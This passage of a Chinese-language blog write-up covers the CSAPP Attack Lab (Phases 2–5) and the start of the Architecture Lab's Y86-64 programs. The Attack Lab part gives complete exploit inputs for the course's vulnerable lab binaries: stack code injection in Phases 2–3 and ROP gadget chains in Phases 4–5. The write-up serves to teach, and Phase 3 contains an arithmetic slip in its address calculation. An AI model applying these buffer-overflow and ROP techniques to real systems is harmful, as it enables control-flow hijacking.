class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">c0</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h3 id="Phase-2-1"><a href="#Phase-2-1" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>执行CTARGET，要求在getbuf返回时执行touch2而非test，将cookie(<code>0x59b997fa</code>)作为参数传递（存放于%rdi），并且使用 <code>ret</code> 指令将控制转移给touch2。</p><p>检查touch2，获取起始地址为<code>0x4017ec</code>，将其压栈后使用使用 <code>ret</code> 指令转移控制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp<br># ... omitted<br>0x0000000000401847 &lt;+91&gt;:    call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>构造以下代码完成操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq  $0x59b997fa, %rdi<br>pushq $0x4017ec<br>ret<br></code></pre></td></tr></table></figure><p>接下来确定%rsp，在getbuf函数中的相关操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br></code></pre></td></tr></table></figure><p>在<code>0x4017ac</code>处打断点得到%rsp：</p><p><img src="/CSAPP3e_WP/image-20240129095931505-172450353221319.png" alt="image-20240129095931505" style="zoom:67%;" align="left"></p><p>得到输入序列（注入指令与返回地址之间的部分随意输入）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">02</span> <span class="hljs-number">02</span> <span class="hljs-number">02</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">03</span> <span class="hljs-number">03</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h3 id="Phase-3-1"><a href="#Phase-3-1" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>执行CTARGET，要求在getbuf返回时执行touch3而非test，将cookie的字符串形式(<code>&quot;35 39 62 39 39 37 66 61&quot;</code>)作为参数，返回地址存放于%rdi。</p><p>检查touch3，获取起始地址为<code>0x4018fa</code>，将其压栈后使用使用 <code>ret</code> 指令转移控制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004018fa &lt;+0&gt;:     push   %rbx<br># ... omitted<br>0x0000000000401963 &lt;+105&gt;:   call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>缓冲区和返回地址一共占用48个DWord，为了使字符串不被覆盖，计算cookie字符串的地址为<code>0x5561dca8</code>+ <code>0x30</code>&#x3D;<code>0x5561dca8</code>，构造以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq  $0x5561dca8, %rdi<br>pushq $0x4018fa<br>ret<br></code></pre></td></tr></table></figure><p>得到输入序列（注入指令与返回地址之间的部分随意输入）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">30</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">35</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><h3 id="Phase-4-1"><a href="#Phase-4-1" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>执行RTARGET，RTARGET设置了栈随机化，且栈区内存不可执行。Phase 4返回要求与Phase 2相同（在getbuf返回时执行touch2）。</p><p>获取<code>farm.c</code>中的gadget：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c -Og farm.c<br>objdump -d farm.o &gt; farm_ins.d<br></code></pre></td></tr></table></figure><p>需要实现将cookie放到%rdi并传递给touch2，即以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq %rax<br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure><p>可用的gadget如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000000000 &lt;start_farm&gt;:<br>   0:f3 0f 1e fa          endbr64<br>   4:b8 01 00 00 00       mov    $0x1,%eax<br>   9:c3                   ret<br><br>000000000000000a &lt;getval_142&gt;:<br>   a:f3 0f 1e fa          endbr64<br>   e:b8 fb 78 90 90       mov    $0x909078fb,%eax<br>  13:c3                   ret<br><br>0000000000000014 &lt;addval_273&gt;:<br>  14:f3 0f 1e fa          endbr64<br>  18:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax<br>  1e:c3                   ret<br><br>000000000000001f &lt;addval_219&gt;:<br>  1f:f3 0f 1e fa          endbr64<br>  23:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax<br>  29:c3                   ret<br><br>000000000000002a &lt;setval_237&gt;:<br>  2a:f3 0f 1e fa          endbr64<br>  2e:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)<br>  34:c3                   ret<br><br>0000000000000035 &lt;setval_424&gt;:<br>  35:f3 0f 1e fa          endbr64<br>  39:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)<br>  3f:c3                   ret<br><br>0000000000000040 &lt;setval_470&gt;:<br>  40:f3 0f 1e fa          endbr64<br>  44:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)<br>  4a:c3                   ret<br><br>000000000000004b &lt;setval_426&gt;:<br>  4b:f3 0f 1e fa          endbr64<br>  4f:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)<br>  55:c3                   ret<br><br>0000000000000056 &lt;getval_280&gt;:<br>  56:f3 0f 1e fa          endbr64<br>  5a:b8 29 58 90 c3       mov    $0xc3905829,%eax<br>  5f:c3                   ret<br><br>0000000000000060 &lt;mid_farm&gt;:<br>  60:f3 0f 1e fa          endbr64<br>  64:b8 01 00 00 00       mov    $0x1,%eax<br>  69:c3                   ret<br></code></pre></td></tr></table></figure><p><code>popq %rax</code>编码为<code>58</code>，在函数<code>getval_280</code>中，反编译得到起始地址为<code>0x4019ca</code>，<code>popq %rax</code>指令地址为<code>0x4019cc</code>，该指令之后为<code>ret</code>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004019ca &lt;+0&gt;:     mov    $0xc3905829,%eax<br>0x00000000004019cf &lt;+5&gt;:     ret<br></code></pre></td></tr></table></figure><p><code>movq %rax,%rdi</code>编码为<code>48 89 c7</code>，在函数<code>addval_273</code>中，反编译得到起始地址为<code>0x4019a0</code>，<code>movq %rax,%rdi</code>指令地址为<code>0x4019a2</code>，该指令之后为<code>ret</code>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004019a0 &lt;+0&gt;:     lea    -0x3c3876b8(%rdi),%eax<br>0x00000000004019a6 &lt;+6&gt;:     ret<br></code></pre></td></tr></table></figure><p>构造输入序列，随意填满缓冲区，然后设置返回地址及参数cookie(<code>0x59b997fa</code>)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">33</span> <span class="hljs-number">33</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h3 id="Phase-5-1"><a href="#Phase-5-1" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>执行RTARGET，Phase 5返回要求与Phase 3相同（在getbuf返回时执行touch3）。</p><p>存放字符串的地址需要计算以%rsp为基准的偏移量，找一个利用加法的gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000000042 &lt;add_xy&gt;:<br>  42:48 8d 04 37          lea    (%rdi,%rsi,1),%rax<br>  46:c3                   retq   <br></code></pre></td></tr></table></figure><p>Phase 5需要实现以下功能：</p><p>·将%rsp装入%rdi</p><p>·将偏移量装入%rsi</p><p>·计算%rax&#x3D;%rdi+%rsi，将返回值装入%rdi</p><p>和Phase 4类似，在获取的gadget中寻找以下指令序列，需要执行的指令和<code>ret</code>之间可以含有若干个<code>nop</code>指令：</p><p><code>&lt; addval_190 +3 &gt;</code>处<code>48 89 e0</code> (<code>movq %rsp, %rax</code>)，</p><p><code>&lt; addval_273 +2 &gt;</code>处<code>48 89 c7</code> (<code>movq %rax, %rdi</code>),</p><p><code>&lt; getval_280 +2 &gt;</code>处<code>58</code>(<code>popq %rax</code>),</p><p><code>popq %rax</code>后存放字符串首地址的偏移量(不超过32位二进制数范围)，考虑之后的指令，可将偏移量从%eax装入%esi：</p><p><code>&lt; getval_481 +2 &gt;</code>处<code>89 c2</code>(<code>movl %eax, %edx</code>),</p><p><code>&lt; getval_159 +1 &gt;</code>处<code>89 d1</code>(<code>movl %edx, %ecx</code>),</p><p><code>&lt; addval_436 +2 &gt;</code>处<code>89 ce</code>(<code>movl %ecx, %esi</code>),</p><p>随后执行：</p><p><code>&lt; add_xy &gt; </code>处<code>48 8d 04 37</code>(<code>lea (%rdi,%rsi,1),%rax</code>),</p><p><code>&lt; addval_273 +2 &gt;</code>处<code>48 89 c7</code> (<code>movq %rax, %rdi</code>)。</p><p>下一行为touch3的起始地址，反编译得到所需输入如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># buffer end</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-comment"># offset</span><br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">34</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span># string<br></code></pre></td></tr></table></figure><p>故偏移量为6个地址的长度72即<code>0x48</code>，随意填满缓冲区，得到输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">34</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p><strong>Attack Lab结束。</strong></p><h2 id="4-Architecture-Lab-复用，丧心病狂"><a href="#4-Architecture-Lab-复用，丧心病狂" class="headerlink" title="4. Architecture Lab: 复用，丧心病狂"></a>4. Architecture Lab: 复用，丧心病狂</h2><p>准备工作：对gcc 10+的编译器打开编译选项<code>-fcommon</code>。</p><p>并对<code>ssim.c</code>, <code>psim.c</code>删除含有<code>matherr</code>的部分：</p><p><img src="/CSAPP3e_WP/image-20240130112206290-172450353894821.png" alt="image-20240130112206290" style="zoom:80%;" align="left"></p><h3 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h3><p>只需要按照<code>examples.c</code>的程序编写汇编代码即可，没有特别的难点，故下文直接给出解法。</p><h4 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample linked list<br>    .align 8<br>ele1:<br>    .quad  0x00a<br>    .quad  ele2<br>ele2:<br>    .quad  0x0b0<br>    .quad  ele3<br>ele3:<br>    .quad  0xc00<br>    .quad  0<br><br>main:<br>    irmovq ele1,%rdi<br>    call   sum<br>    ret<br>sum:<br>    xorq   %rax,%rax<br>    jmp    test<br>loop:<br>    mrmovq (%rdi),%rsi<br>    addq   %rsi,%rax<br>    mrmovq $8(%rdi),%rdi<br>test:    <br>    andq   %rdi,%rdi<br>    jne    loop<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure><h4 id="rsum"><a href="#rsum" class="headerlink" title="rsum"></a>rsum</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample linked list<br>    .align 8<br>ele1:<br>    .quad  0x00a<br>    .quad  ele2<br>ele2:<br>    .quad  0x0b0<br>    .quad  ele3<br>ele3:<br>    .quad  0xc00<br>    .quad  0<br><br>main:<br>    irmovq ele1,%rdi<br>    call   rsum<br>    ret<br>rsum:<br>    pushq  %rsi<br>    xorq   %rax,%rax<br>    andq   %rdi,%rdi<br>    je     end<br>    mrmovq (%rdi),%rsi<br>    mrmovq $8(%rdi),%rdi<br>    call   rsum<br>    addq   %rsi,%rax<br>end:    <br>    popq   %rsi<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure><h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample blocks<br>.align 8<br>src:<br>    .quad 0x00a<br>    .quad 0x0b0<br>    .quad 0xc00<br>dest:<br>    .quad 0x111<br>    .quad 0x222<br>    .quad 0x333<br><br>main:<br>    irmovq 